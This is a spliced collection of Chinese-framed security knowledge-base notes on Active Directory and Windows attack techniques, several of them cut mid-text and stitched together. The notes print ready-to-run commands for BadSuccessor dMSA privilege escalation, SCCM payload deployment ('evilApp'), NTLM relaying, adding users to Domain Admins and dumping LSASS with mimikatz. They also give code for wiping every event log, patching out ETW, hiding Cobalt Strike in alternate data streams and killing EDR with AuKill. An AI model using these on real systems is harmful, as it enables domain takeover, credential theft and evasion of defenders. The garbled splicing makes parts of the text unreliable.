content: 来源路径： 02-知识点/域与Windows/BadSuccessor- 权限提升 via Delegated MSA Migration Abuse.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # BadSuccessor- 权限提升 via Delegated MSA Migration Abuse [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 BadSuccessor- 权限提升 via Delegated MSA Migration Abuse 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 BadSuccessor- 权限提升 via Delegated MSA Migration Abuse 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：BadSuccessor: 权限提升 via Delegated MSA Migration Abuse、Overview、Attack prerequisites、Enumerating Vulnerable OUs、利用 Steps；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 BadSuccessor: 权限提升 via Delegated MSA Migration Abuse Overview Attack prerequisites Enumerating Vulnerable OUs 利用 Steps Automation Post - 利用 检测 & Hunting Mitigation See also # 核心要点 This technique was coined BadSuccessor by Unit 42 in 2025. At the time of writing no security patch is available; only hardening of OU permissions mitigates the issue. Network connectivity to LDAP & Kerberos (standard domain joined scenario / remote attack). Unit 42 released a PowerShell helper script that parses security descriptors of each OU and highlights the required ACEs: Under the hood the script runs a paged LDAP search for (objectClass=organizationalUnit) and checks every nTSecurityDescriptor for Once a writable OU is identified the attack is only 3 LDAP writes away: After replication the attacker can simply logon as attacker dMSA$ or request a Kerberos TGT – Windows will build the 令牌 of the superseded account. BadSuccessor.ps1 (PowerShell) – https://github.com/LuemmelSec/Pentest - 工具 - Collection/blob/main/ 工具 / ActiveDirectory/BadSuccessor.ps1 Apply the principle of least privilege – only delegate Service Account management to trusted roles. # 命令 / 载荷 / 操作片段 # 1. Enumerating Vulnerable OUs 1Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local # 2. 利用 Steps 1234567891011# 1. Create a new delegated MSA inside the delegated OUNew-ADServiceAccount -Name attacker_dMSA \ -DNSHostName host.contoso.local \ -Path "OU=DelegatedOU,DC=contoso,DC=com"# 2. Point the dMSA to the target account (e.g. Domain Admin)Set-ADServiceAccount attacker_dMSA -Add \ @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}# 3. Mark the migration as *completed*Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2} # 3. Post - 利用 123456# Request a TGT for the dMSA and inject it (Rubeus)Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.localRubeus ptt /ticket:<Base64TGT># Access Domain Admin resourcesdir \\DC01\C$ # 工具与参考入口 https://github.com/logangoins/SharpSuccessor https://github.com/Pennyw0rth/NetExec BadSuccessor.ps1 – Pentest - 工具 - Collection NetExec BadSuccessor module # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: BadSuccessor 技术笔记
content: 来源路径： 02-知识点/域与Windows/BadSuccessor 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # BadSuccessor 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 BadSuccessor 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 BadSuccessor 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：BadSuccessor、Overview、dMSA migration details that matter、Requirements、Practical checks；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 BadSuccessor Overview dMSA migration details that matter Requirements Practical checks Abuse flow Why this is more than 权限提升 Notes on patch status 工具 # 核心要点 In practice this means a low-privileged user who only has delegated OU rights can create a new dMSA, point it at Administrator, complete the migration state, and then obtain a TGT whose PAC contains privileged groups such as Domain Admins. During legitimate migration, the dMSA is meant to replace the superseded account transparently, so the KDC/LSA preserve access that the previous account already had. The attacker can create msDS-DelegatedManagedServiceAccount objects in some OU, or has equivalent broad child-object creation rights there. The attacker can write the relevant dMSA attributes or fully control the dMSA they just created. The attacker can request Kerberos tickets from a domain-joined context or from a tunnel that reaches LDAP/Kerberos. The cleanest operator signal is to verify the domain/forest level and confirm the environment is already using the new Server 2025 stack: 权限提升 by inheriting privileged group SIDs in the PAC. Credential material exposure because previous-key handling can expose material equivalent to the predecessor's RC4/NT 哈希 in vulnerable workflows. # 命令 / 载荷 / 操作片段 # 1. Practical checks 12Get-ADDomain | Select Name,DomainModeGet-ADForest | Select Name,ForestMode # 2. Practical checks 1.\Get-BadSuccessorOUPermissions.ps1 # 3. Practical checks 1netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor # 4. Abuse flow 12345New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"Set-ADServiceAccount attacker_dMSA -Add @{ msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"}Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2} # 5. Abuse flow 12Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator # 工具与参考入口 Akamai BadSuccessor tooling SharpSuccessor NetExec badsuccessor module HTB: Eighteen Akamai：BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory 域 Microsoft Learn：Delegated Managed Service Accounts overview Microsoft Security Response Center：CVE-2025-53779 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

How Does it works 1At \\victim 11:00:00PM shutdown -r # 2. For additional attack techniques and defense strategies related to application and script deployment in SCCM, refer to the following techniques from the Misconfiguration-Manager repository: https://posts.specterops.io/relaying-ntlm - 认证 - from-sccm-clients-7dccb8f92867 In this final step you can choose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM 认证. Note the following: To capture and relay NTLM 凭据，the target device must support NTLM (very likely). With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory 域 machines with PowerSCCM (Powershell). # 命令 / 载荷 / 操作片段 # 1. Practice 1SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames # 2. Practice 123456# Search for device of user "Frank.Zapper"SharpSCCM.exe get primary-users -u Frank.Zapper# List all active SCCM devices where the SCCM client is installed### CAUTION: This could be hugeSharpSCCM.exe get devices -w "Active=1 and Client=1" # 3. Practice 123456# Prep capturing server## ntlmrelayx targeting 10.250.2.179ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179# Also keep Pcredz running, just in casePcredz -i enp0s8 -t # 4. Practice 12# Run the attackSharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET # 5. Practice 123456789101112131415161718192021# Create a SCCM Session via WMI with the Site CodeFind-SccmSiteCode -ComputerName SCCMServerNew-SccmSession -ComputerName SCCMServer -SiteCode $SITE_CODE -ConnectionType WMI# Retrieve the computers linked to the SCCM serverGet-SccmSession | Get-SccmComputer# Create a computer collectionGet-SccmSession | New-SccmCollection -CollectionName "collection" -CollectionType "Device"# Add computers to the collectionGet-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "target" -CollectionName "collection"# Create an application to deployGet-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 $BASE64_PAYLOAD# Create an application deployment with the application and the collection previously createdGet-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -AssignmentName "assig" -CollectionName "collection"# Force the machine in the collection to check the application update (and force the install)Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection" # 6. The only way to detect them is in case the NTFS file-system is mounted with write permissions. If it's mounted just with read permissions it won't be possible to detect the intrusion. Clear your registry subtrees that look like HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist <哈希>. This will save information about the applications executed with the goal of improving the performance of the Windows system. However, this can also be useful for 取证 practices. for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1" Post‑利用，attackers fetched legitimate JARs from Maven Central (repo1.maven.org), deleted vulnerable JARs in the ActiveMQ install, and restarted the broker. Debian/Ubuntu: dpkg -V activemq and compare file hashes/paths with repo mirrors. Shell history/process telemetry: evidence of curl/wget to repo1.maven.org or other artifact CDNs immediately after initial 利用. 密码‑protected PyInstaller ELF loaders to hinder sandboxing and static analysis (e.g., encrypted PYZ, temporary extraction under / MEI*). Dropbox‑backed C2 using hardcoded OAuth Bearer tokens Network markers: api.dropboxapi.com / content.dropboxapi.com with 授权: Bearer <令牌>. SSH configuration hardening rollback: enabling root logins and altering default shells for low‑privileged accounts. Hunt for suspicious interactive shells on system accounts (e.g., games): # 命令 / 载荷 / 操作片段 # 1. PowerShell ScriptBlock/Module Logging 123456789# Turn OFF ScriptBlock & Module logging (registry persistence)New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \ -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -ForceNew-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \ -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force# In-memory wipe of recent PowerShell logsGet-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Remove-WinEvent # requires admin & Win11 23H2+ # 2. ETW (Event Tracing for Windows) Patch 12345// 0xC3 = RET on x64unsigned char patch[1] = { 0xC3 };WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"), patch, sizeof(patch), NULL); # 3. Alternate Data Streams (ADS) Revival 1234rem Hide cobalt.bin inside an ADS of a PDFtype cobalt.bin > report.pdf:win32res.dllrem Execute directlywmic process call create "cmd /c report.pdf:win32res.dll" # 4. BYOVD & “AuKill” (2023) 12AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"AuKill.exe -k CrowdStrike # 5. Self‑patching compromised services to reduce 检测 (Linux) 123456789101112131415# ActiveMQ install root (adjust as needed)AMQ_DIR=/opt/activemqcd "$AMQ_DIR"/lib# Fetch patched JARs from Maven Central (versions as appropriate)curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jarcurl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar# Remove vulnerable files and ensure the service uses the patched onesrm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || trueln -sf activemq-client-5.18.3.jar activemq-client.jarln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar# Apply changes without removing persistencesystemctl restart activemq || service activemq restart # 6. 持久化 and “hardening rollback” to maintain access (Linux examples) 12for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done

content: 来源路径： 02-知识点/域与Windows/Advanced DLL Side-Loading With HTML-Embedded 载荷 Staging.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Advanced DLL Side-Loading With HTML-Embedded 载荷 Staging [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Advanced DLL Side-Loading With HTML-Embedded 载荷 Staging 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Advanced DLL Side-Loading With HTML-Embedded 载荷 Staging 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Tradecraft Overview、Multi-Stage Side-Loading Chain、HTML 容器 Parsing Pattern、Quick Extraction Helper (Python)、HTML Staging 规避 Parallels；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Tradecraft Overview Multi-Stage Side-Loading Chain HTML 容器 Parsing Pattern Quick Extraction Helper (Python) HTML Staging 规避 Parallels Recent Variant Notes (2024-2025) 密码学 & C2 Hardening 持久化 & Execution Loop Using Benign Sync Clients for Exfiltration 检测 Pivots # 核心要点 Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML 载荷，and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on: DLL search order abuse: the victim double-clicks the EXE, Windows resolves the DLL import from the current directory, and the malicious loader (AshenLoader) executes inside the trusted process while the decoy PDF opens to avoid suspicion. Decoy EXE → AshenLoader: the EXE side-loads AshenLoader, which performs host 侦察，AES-CTR encrypts it, and POSTs it inside rotating parameters such as 令牌 =, id=, q=, or auth= to API-looking paths (e.g., /api/v2/account). AshenOrchestrator: a modular .NET controller that decodes a Base64 JSON config. The config’s tg and au fields are concatenated/hashed into the AES key, which decrypts xrk. The resulting bytes act as an XOR key for every module blob fetched afterwards. 侦察 smuggling: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host. URI churn: query parameters and REST paths rotate between campaigns (/api/v1/account? 令牌 = → /api/v2/account?auth=), invalidating brittle detections. Alert on signed processes that unexpectedly load DLLs from user-writable paths (Procmon filters + Get-ProcessMitigation -Module), especially when the DLL names overlap with netutils, srvcli, dwampi, or wtsapi32. Track C2 redirects that only return 载荷 for exact User-Agent strings and otherwise bounce to legitimate news/health domains. # 命令 / 载荷 / 操作片段 # 1. HTML 容器 Parsing Pattern 12345var tag = Regex.Match(html, "").Groups[1].Value;var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);var module = XorBytes(aesBytes, xorKey);LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module))); # 2. Quick Extraction Helper (Python) 1234567import base64, re, requestshtml = requests.get(url, headers={"User-Agent": ua}).texttag = re.search(r"", html, re.I).group(1)b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)blob = base64.b64decode(b64)# decrypt blob with AES-CTR, then XOR if required # 工具与参考入口 Rclone Hidden between the tags: Insights into 规避 techniques in HTML smuggling WIRTE: In Search of Lost Time # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It can also be achieved from UNIX-like system with net, a tool for the administration of samba and cifs/smb clients. The pth-toolkit can also be used to run net commands with 哈希传递. The attacker can add a user/group/computer to a group. This can be achieved with a native command line, with the Active Directory 域 PowerShell module, or with Add-DomainGroupMember (PowerView module). The Invoke-PassTheCert fork can also be used, authenticating through Schannel via PassTheCert (PowerShell version). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). # 命令 / 载荷 / 操作片段 # 1. AddMember 12345678# With net and cleartext credentials (will be prompted)net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"# With net and cleartext credentialsnet rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"# With Pass-the-Hashpth-net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST" # 2. AddMember 1bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser" # 3. AddMember 1ldeep ldap -d "$DOMAIN" -s "$DC_IP" -u "$USER" -p "$PASSWORD" add_to_group "$TargetUser" "$TargetGroup" # 4. AddMember 12345678# Command linenet group 'Domain Admins' 'user' /add /domain# Powershell: Active Directory moduleAdd-ADGroupMember -Identity 'Domain Admins' -Members 'user'# Powershell: PowerSploit moduleAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'user' # 5. AddMember 12345678910# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Adds the member 'Kinda KU. USY' into the group 'Domain Admins'Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection $LdapConnection -Identity 'CN=Kinda KU. USY,CN=Users,DC=X' -GroupDN 'CN=Domain Admins,CN=Users,DC=X' # 工具与参考入口 net pth-toolkit bloodyAD ldeep Add-DomainGroupMember PowerView Invoke-PassTheCert PassTheCert README certreq # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This page documents: Network/profile indicators for HTTP/SMB/TCP listeners Common loader and 持久化 TTPs observed in the wild, with links to relevant Windows technique pages BEACON SMB: named‑pipe peer‑to‑peer C2 (intranet) 下载 chunk size (u32) Observed malicious HTTP profile (real attack): Extraction is deterministic: read size, read ciphertext of that size, read the 16‑byte key placed immediately after, then RC4‑decrypt. When automating, use a PE parser to read .rdata then apply a sliding window: for each offset o, try size = u32(.rdata[o:o+4]), ct = .rdata[o+4:o+4+size], candidate key = next 16 bytes; RC4‑decrypt and check that string fields decode as UTF‑8 and lengths are sane. Parse SMB/TCP profiles by following the same length‑prefixed conventions. SMB named‑pipe listeners for intranet C2 where web egress is constrained 下载 Base64/XOR 载荷 (Invoke‑RestMethod / WebClient) Allocate unmanaged memory, copy shellcode, switch protection to 0x40 (PAGE EXECUTE READWRITE) via VirtualProtect Execute via .NET dynamic invocation: Marshal.GetDelegateForFunctionPointer + delegate.Invoke() PowerShell spawning RW→RX transitions: VirtualProtect to PAGE EXECUTE READWRITE inside powershell.exe # 命令 / 载荷 / 操作片段 # 1. title: Active Directory 域 Web Services (ADWS) 枚举 & Stealth Collection
content: 来源路径： 02-知识点/域与Windows/Active Directory 域 Web Services (ADWS) 枚举 & Stealth Collection.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Active Directory 域 Web Services (ADWS) 枚举 & Stealth Collection [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Active Directory 域 Web Services (ADWS) 枚举 & Stealth Collection 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Active Directory 域 Web Services (ADWS) 枚举 & Stealth Collection 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：What is ADWS?、SoaPy – Native Python Client、Key Features、Targeted collection flags & write operations、Installation (operator host)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 14 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 What is ADWS? SoaPy – Native Python Client Key Features Targeted collection flags & write operations Installation (operator host) ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows) Installation Usage Sopa：A practical client for ADWS in Golang Protocol mapping highlights Unauthenticated metadata discovery (mex) DNS/DC discovery & Kerberos targeting notes Auth material options Custom object creation via templates SOAPHound – High-Volume ADWS Collection (Windows) Stealth AD Collection Workflow Writing msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD) Tooling Summary # 核心要点 Because the traffic is encapsulated inside these binary SOAP frames and travels over an uncommon port, 枚举 through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic. For operators this means: Stealthier 侦察 – Blue teams often concentrate on LDAP queries. The same data you would obtain via LDAP (users, groups, ACLs, schema, etc.) and the ability to perform writes (e.g. msDs-AllowedToActOnBehalfOfOtherIdentity for RBCD). NOTE: ADWS is also used by many RSAT GUI/PowerShell 工具，so traffic may blend with legitimate admin activity. Fine-grained search filters identical to LDAP -q '(objectClass=user)'. Optional write operations ( --set / --delete ). --parse flag to prettify timestamps / userAccountControl when human readability is required. Fork of ldapdomaindump that swaps LDAP queries for ADWS calls on TCP/9389 to reduce LDAP-signature hits. Performs an initial reachability check to 9389 unless --force is passed (skips the probe if port scans are noisy/filtered). Tested against Microsoft Defender for Endpoint and CrowdStrike Falcon with successful 绕过 in the README. Account management：set - 密码 /change - 密码 LDAP-style searches are issued via WS - 枚举 (Enumerate + Pull) with attribute projection, scope control (Base/OneLevel/Subtree) and pagination. 密码 operations are MS-ADCAP actions (SetPassword, ChangePassword). If Kerberos is enabled and --dc is an IP, sopa performs a reverse PTR to obtain an FQDN for correct SPN/KDC targeting. If Kerberos is not used, no PTR lookup happens. # 命令 / 载荷 / 操作片段 # 1. Targeted collection flags & write operations 12soapy corp.local/alice:'Winter2025!'@dc01.corp.local \ --spns -f samAccountName,servicePrincipalName --parse # 2. Installation (operator host) 1python3 -m pip install soapy-adws # or git clone && pip install -r requirements.txt # 3. Installation 1pipx install . # 4. Usage 1adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local # 5. Usage 123456[*] Connecting to ADWS host...[+] ADWS port 9389 is reachable[*] Binding to ADWS host[+] Bind OK[*] Starting domain dump[+] Domain dump finished # 6. Unauthenticated metadata discovery (mex) 1sopa mex --dc <DC> # 7. DNS/DC discovery & Kerberos targeting notes 12_ldap._tcp.<domain>_kerberos._tcp.<domain> # 8. DNS/DC discovery & Kerberos targeting notes 1sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass # 9. Auth material options 12345# NT hashsopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'# Kerberos ccachesopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain # 10. SOAPHound – High-Volume ADWS Collection (Windows) 1234567891011# Build cache (JSON map of every object SID/GUID)SOAPHound.exe --buildcache -c C:\temp\corp-cache.json# BloodHound collection in autosplit mode, skipping LAPS noiseSOAPHound.exe -c C:\temp\corp-cache.json --bhdump \ --autosplit --threshold 1200 --nolaps \ -o C:\temp\BH-output# ADCS & DNS enrichment for ESC chainsSOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-outputSOAPHound.exe --dnsdump -o C:\temp\dns-snapshot # 11. Stealth AD Collection Workflow 123soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \ -q '(objectClass=domain)' \ | tee data/domain.log # 12. Stealth AD Collection Workflow 12345soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \ -dn &#x2

There are two types of tokens available: Impersonation 令牌: Empowers a server application to adopt the client's identity temporarily for accessing secure objects. This mechanism is stratified into four levels of operation: Delegation: Similar to Impersonation but includes the ability to extend this identity assumption to remote systems the server interacts with, ensuring credential preservation. # 命令 / 载荷 / 操作片段 # 1. 凭据 user impersonation 1runas /user:domain\username cmd.exe # 2. 凭据 user impersonation 1runas /user:domain\username /netonly cmd.exe # 工具与参考入口 all the possible 令牌 privileges and some definitions on this external page # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

With the privileged impersonation 令牌 you can derivate a primary 令牌 (DuplicateTokenEx).\ With the 令牌，you can create a new process with 'CreateProcessAsUser' or create a process suspended and set the 令牌 (in general, you cannot modify the primary 令牌 of a running process). You can abuse this privilege with: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug Or as explained in the escalating privileges with Backup Operators section of: Impersonation without SeImpersonatePrivilege: It's possible to leverage SeCreateTokenPrivilege for EoP by impersonating tokens under specific conditions. Conditions for 令牌 Impersonation: Successful impersonation requires the target 令牌 to belong to the same user and have an integrity level that is less or equal to the integrity level of the process attempting impersonation. Creation and Modification of Impersonation Tokens: Users can create an impersonation 令牌 and enhance it by adding a privileged group's SID (Security Identifier). ImagePath, which is the path to the binary to be executed SeDebugPrivilege - 利用 (C++) SeDebugPrivilegePoC (C#) # 命令 / 载荷 / 操作片段 # 1. SeLoadDriverPrivilege 123456789# Example Python code to set the registry valuesimport winreg as reg# Define the path and valuespath = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as neededkey = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)reg.CloseKey(key) # 2. SeTakeOwnershipPrivilege 12345678910111213takeown /f 'C:\some\file.txt' #Now the file is owned by youicacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access# Use this with files that might contain credentials such as%WINDIR%\repair\sam%WINDIR%\repair\system%WINDIR%\repair\software%WINDIR%\repair\security%WINDIR%\system32\config\security.sav%WINDIR%\system32\config\software.sav%WINDIR%\system32\config\system.sav%WINDIR%\system32\config\SecEvent.Evt%WINDIR%\system32\config\default.savc:\inetpub\wwwwroot\web.config # 3. Dump memory 1234mimikatz.exemimikatz # logmimikatz # sekurlsa::minidump lsass.dmpmimikatz # sekurlsa::logonpasswords # 4. RCE 12# Get the PID of a process running as NT SYSTEMimport-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>) # 5. Check privileges 1whoami /priv # 6. Enable All the tokens 12.\EnableAllTokenPrivs.ps1whoami /priv # 工具与参考入口 juicy-potato RogueWinRM SweetPotato PrintSpoofer https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab channel=IppSec ProcDump SysInternals Suite LSASS SeDebugPrivilege - 利用 (C++) SeDebugPrivilegePoC (C#) psgetsys.ps1 (Powershell Script) EnableAllTokenPrivs.ps1 post https://github.com/gtworek/Priv2Admin Aurélien Chalot FuzzySecurity this paper # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) 技术笔记
